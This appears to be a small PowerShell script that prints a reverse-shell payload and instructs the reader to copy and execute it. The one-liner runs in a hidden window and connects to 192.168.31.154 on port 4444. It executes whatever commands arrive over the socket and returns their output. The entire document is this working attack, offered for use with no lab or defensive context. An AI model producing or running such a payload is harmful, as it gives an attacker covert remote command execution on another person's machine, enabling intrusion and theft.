Write-Host "Reverse Shell Payload"
Write-Host "Copy and execute this command:"
Write-Host "powershell -w hidden -nop -c "$c=New-Object Net.Sockets.TCPClient('192.168.31.154',4444);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$w.Write('[+] Connection established');$w.Write([char]13);$w.Write([char]10);$w.Write('SHELL> ');$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -gt 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$w.Write($o);$w.Write([char]13);$w.Write([char]10);$w.Write('SHELL> ')};$w.Close()""
Write-Host ""
Write-Host "Waiting for connection on 192.168.31.154:4444"
Timeout /T 30
